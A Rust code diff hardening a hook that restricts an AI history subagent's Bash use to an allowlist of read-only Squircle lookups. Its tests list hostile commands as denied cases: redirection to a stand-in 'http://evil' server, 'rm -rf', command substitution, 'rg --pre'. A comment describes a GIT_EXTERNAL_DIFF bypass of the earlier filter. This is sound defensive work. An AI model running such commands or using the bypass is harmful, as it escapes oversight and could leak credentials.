@@ -35,80 +35,82 @@ pub fn check(event: &Value, cli: &str) -> Option<String> {
         is the one exception, for questions about the app's past). {}", spawn_hint(cli)))
 }
 
-/// Inside the history subagent: reading tools, and shell commands that only read.
+/// Inside the history subagent: Read/Grep/Glob, and Bash only as one plain
+/// call of Squircle's own read-only lookups. An allowlist, not a filter of
+/// shell: no assignments, expansions, redirections or chaining, and no other
+/// program (git's helpers, pagers and drivers, `rg --pre`, … all run code).
 fn history_tool(tool: &str, input: &Value, cli: &str) -> Option<String> {
     let deny = |what: String| Some(format!("The history subagent only reads: {what}. \
-        Use `{cli} history search WORDS` and `{cli} history show REF`, `notes show`, `task list|show`, `thread read|status`, \
-        `build list|status|log`, read-only git (log, show, diff, grep, blame) and Read/Grep/Glob."));
+        Run one `{cli}` lookup per command, exactly as given, with no pipes, redirections or other programs: \
+        `history search WORDS`, `history show REF` (commits too: `commit:SHA`), `notes show`, `task list|show`, \
+        `thread read|status`, `build list|status|log`, `app list|show`, `agent list`. Read files with Read/Grep/Glob."));
     match tool {
         "Read" | "Grep" | "Glob" => None,
-        "Bash" => {
-            let command = input["command"].as_str().unwrap_or("");
-            let scripts: Vec<String> = substitutions(command).into_iter().chain(std::iter::once(command.to_string())).collect();
-            for script in &scripts {
-                for words in simple_commands(script) {
-                    if let Some(why) = read_only(&words) { return deny(why); }
-                }
-            }
-            None
-        }
+        "Bash" => squircle_lookup(input["command"].as_str().unwrap_or(""), cli).err().and_then(deny),
         other => deny(format!("{other} is not available")),
     }
 }
 
-/// Why a simple command might change something, or `None` if it only reads.
-fn read_only(words: &[String]) -> Option<String> {
-    let mut i = 0;
-    while i < words.len() && is_assignment(&words[i]) { i += 1; }
-    let Some(program) = words.get(i) else { return None };
-    let name = program_name(program);
-    let args = &words[i + 1..];
-    let shown = || words[i..].iter().take(4).cloned().collect::<Vec<_>>().join(" ");
-    // Output may go to /dev/null or another descriptor (`2>&1` splits at
-    // `&`, leaving `2>` last and `1` as a "command"), never to a file.
-    for (index, word) in words.iter().enumerate() {
-        let Some((_, target)) = word.rsplit_once('>') else { continue };
-        let target = if target.is_empty() { words.get(index + 1).map_or("", String::as_str) } else { target };
-        if !(target.is_empty() || target == "/dev/null" || target.starts_with('&')) {
-            return Some(format!("`{}` writes a file", shown()));
-        }
+/// `Ok` when `command` is `cli` running one read-only lookup, else why not.
+fn squircle_lookup(command: &str, cli: &str) -> Result<(), String> {
+    let words = plain_words(command).map_err(|c| format!("`{c}` makes the shell do more than run one command"))?;
+    let prefix = plain_words(cli).map_err(|_| "Squircle's path can't be checked".to_string())?;
+    let shown = || words.iter().skip(prefix.len()).take(3).cloned().collect::<Vec<_>>().join(" ");
+    let Some(rest) = words.strip_prefix(prefix.as_slice()) else {
+        return Err(format!("`{}` is not Squircle", words.first().map_or("", String::as_str)));
+    };
+    // The service and data directory are the ones given; anything else could send its credentials elsewhere.
+    if rest.iter().any(|w| ["--data-dir", "--server"].iter().any(|o| w == o || w.starts_with(&format!("{o}=")))) {
+        return Err("only the given --data-dir and --server".into());
     }
-    if words[i..].len() == 1 && name.chars().all(|c| c.is_ascii_digit()) { return None; }
-    let ok = match name.as_str() {
-        "squircle" => {
-            let mut rest = args.iter();
-            let mut sub = Vec::new();
-            while let Some(word) = rest.next() {
-                match word.as_str() {
-                    "--data-dir" | "--server" => { rest.next(); }
-                    w if w == "--json" || w.starts_with("--data-dir=") || w.starts_with("--server=") => {}
-                    w => { sub.push(w); if sub.len() == 2 { break; } }
-                }
-            }
-            matches!(sub.as_slice(),
-                ["history", _] | ["notes", "show"] | ["task", "list" | "show"] | ["thread", "read" | "status"]
-                | ["build", "list" | "status" | "log"] | ["app", "list" | "show"] | ["agent", "list"] | [_, "--help" | "-h"] | ["--help" | "-h", ..])
-        }
-        "git" => {
-            let mut rest = args.iter();
-            let mut sub = None;
-            let mut safe = true;
-            while let Some(word) = rest.next() {
-                match word.as_str() {
-                    "-C" => { rest.next(); }
-                    "--no-pager" => {}
-                    w if w.starts_with('-') => { safe = false; break; }
-                    w => { sub = Some(w); break; }
-                }
-            }
-            safe && matches!(sub, Some("log" | "show" | "diff" | "grep" | "blame" | "status" | "rev-parse" | "ls-files" | "shortlog"))
-                && !rest.any(|w| w.starts_with("--output") || w == "--ext-diff" || w.starts_with("-O") || w.starts_with("--open-files-in-pager"))
-        }
-        "rg" => !args.iter().any(|w| w.starts_with("--pre")),
-        "cat" | "head" | "tail" | "wc" | "ls" | "grep" | "jq" | "echo" | "pwd" | "true" | "cd" => true,
+    let rest: Vec<&str> = rest.iter().map(String::as_str).filter(|w| *w != "--json").collect();
+    let help = |w: &str| w == "--help" || w == "-h";
+    let ok = match rest.as_slice() {
+        [first, ..] if help(first) => true,
+        [_, second] if help(second) => true,
+        [group, sub, ..] => matches!((*group, *sub), ("history", "search" | "show") | ("notes", "show") | ("task", "list" | "show")
+            | ("thread", "read" | "status") | ("build", "list" | "status" | "log") | ("app", "list" | "show") | ("agent", "list")),
         _ => false,
     };
-    (!ok).then(|| format!("`{}` is not a read-only lookup", shown()))
+    if ok { Ok(()) } else { Err(format!("`{}` is not a read-only lookup", shown())) }
+}
+
+/// A command's words if it is one plain command: the shell passes them on
+/// exactly as written, with no expansion, globbing, redirection or chaining.
+/// `Err` is the first character that would make the shell do more.
+fn plain_words(command: &str) -> Result<Vec<String>, char> {
+    let (mut words, mut word, mut in_word) = (Vec::new(), String::new(), false);
+    let mut chars = command.trim().chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            ' ' | '\t' => if in_word { words.push(std::mem::take(&mut word)); in_word = false; },
+            '\'' => {
+                in_word = true;
+                loop {
+                    match chars.next() { Some('\'') => break, Some(c) => word.push(c), None => return Err('\'') }
+                }
+            }
+            '"' => {
+                in_word = true;
+                loop {
+                    match chars.next() {
+                        Some('"') => break,
+                        Some(c @ ('$' | '`' | '\\' | '!')) => return Err(c),
+                        Some(c) => word.push(c),
+                        None => return Err('"'),
+                    }
+                }
+            }
+            // A quote inside a single-quoted path, as `agents::quote` writes it.
+            '\\' if chars.peek() == Some(&'\'') => { chars.next(); in_word = true; word.push('\''); }
+            c if c.is_alphanumeric() || "-_./:,@+%=".contains(c) => { in_word = true; word.push(c); }
+            // Literal mid-word (`doc:PATH#L12`); at a word's start a comment or home directory.
+            '#' | '~' if in_word => word.push(c),
+            c => return Err(c),
+        }
+    }
+    if in_word { words.push(word); }
+    Ok(words)
 }
 
 fn spawn_hint(cli: &str) -> String {
@@ -382,34 +384,49 @@ mod tests {
         assert_eq!(check(&call("Edit", json!({"file_path": "/x"})), "sq"), None);
 
         let inside = |tool: &str, input: Value| json!({"hook_event_name": "PreToolUse", "agent_id": "a1", "agent_type": "squircle:history", "tool_name": tool, "tool_input": input});
-        let cli = "\"/Users/me/RemoteAppDev/target/release/squircle\" --data-dir /Users/me/.squircle --server http://127.0.0.1:8787";
+        let cli = "'/Users/me/Remote App'\\''s/target/release/squircle' --data-dir /Users/me/.squircle --server http://127.0.0.1:8787";
         for command in [
             format!("{cli} history search simulator deck --since 14d"),
-            format!("{cli} --json history show msg:assistant:4e17 2>&1 | head -40"),
-            format!("{cli} notes show && {cli} task list --thread t; {cli} thread read abc"),
-            format!("{cli} build status b 2>/dev/null"),
-            "git log --oneline -20 -- src/guard.rs".into(),
-            "git -C /repo show --stat abc123".into(),
-            "rg -n 'tilt' docs | head".into(),
-            "cd /repo && cat AGENTS.md | grep -n Tasks".into(),
+            format!("{cli} --json history show msg:assistant:4e17 --max-chars 8000"),
+            format!("{cli} history show doc:docs/a.md#L12"),
+            format!("{cli} history search \"why no tilt\" 'Größe' --in commits,docs"),
+            format!("{cli} notes show"),
+            format!("  {cli} task list --thread t"),
+            format!("{cli} build log b --json"),
+            format!("{cli} thread --help"),
         ] {
-            assert_eq!(check(&inside("Bash", json!({"command": command})), "sq"), None, "denied: {command}");
+            assert_eq!(check(&inside("Bash", json!({"command": command})), cli), None, "denied: {command}");
         }
         for command in [
+            // The reproducer: an environment assignment makes git run any program.
+            "GIT_EXTERNAL_DIFF=/tmp/h git diff --no-index a b".into(),
+            "git diff --no-index a b".into(),
+            "git log --oneline".into(),
+            format!("SQUIRCLE_SERVER=http://evil {cli} history search x"),
+            format!("env {cli} history search x"),
+            format!("{cli} history search x --server http://evil"),
+            format!("{cli} history search x --data-dir=/tmp/d"),
+            format!("/tmp/squircle --data-dir /Users/me/.squircle --server http://127.0.0.1:8787 history search x"),
             format!("{cli} notes add 'x'"),
             format!("{cli} thread spawn --coordinator t --title x --branch b --prompt p"),
             format!("{cli} task update t --status done"),
             format!("{cli} history search x > /tmp/out"),
-            "git -c core.pager='sh -c touch' log".into(),
-            "git log --output=/tmp/x".into(),
-            "git checkout main".into(),
+            format!("{cli} history search x 2>/dev/null"),
+            format!("{cli} history search x | head"),
+            format!("{cli} notes show; rm -rf y"),
+            format!("{cli} notes show && touch y"),
+            format!("{cli} notes show\ntouch y"),
+            format!("{cli} history search \"$(touch y)\""),
+            format!("{cli} history search `touch y`"),
+            format!("{cli} history search $HOME"),
+            format!("{cli} history search *"),
+            format!("{cli} history search 'unterminated"),
+            format!("{cli}"),
+            "cat AGENTS.md".into(),
             "rg --pre ./run x".into(),
-            "echo $(rm -rf build)".into(),
-            "cat x; rm -rf y".into(),
             "codex exec 'summarize'".into(),
-            "sqlite3 ~/.t3/userdata/state.sqlite 'delete from x'".into(),
         ] {
-            assert!(check(&inside("Bash", json!({"command": command})), "sq").is_some(), "allowed: {command}");
+            assert!(check(&inside("Bash", json!({"command": command})), cli).is_some(), "allowed: {command}");
         }
         for tool in ["Edit", "Write", "NotebookEdit", "Agent", "Workflow", "Monitor"] {
             assert!(check(&inside(tool, json!({})), "sq").is_some(), "allowed {tool}");
